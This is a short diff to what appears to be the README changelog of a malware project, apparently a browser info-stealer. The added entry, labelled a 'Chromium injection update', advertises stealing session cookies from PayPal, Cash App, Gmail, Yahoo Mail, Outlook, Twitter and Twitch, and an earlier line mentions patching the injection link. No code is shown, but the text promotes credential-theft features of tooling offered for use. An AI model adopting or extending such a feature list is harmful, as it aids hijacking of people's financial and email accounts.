@@ -274,6 +274,17 @@ v7.8: 2023-06-19
 
 v7.9: 2023-06-20
 - Injection patched (bruh i've put the bad link)
+
+
+v7.9.8: 2023-06-22 (Chromium injection update)
++ Steal cookies from: 
+- "https://www.paypal.com"
+- "https://cash.app"
+- "https://mail.yahoo.com"
+- "https://mail.google.com"
+- "https://twitter.com/home"
+- "https://www.twitch.tv"
+- "https://outlook.live.com"
 ```
 
 ## <a id="preview"></a>👁️ 〢 Preview
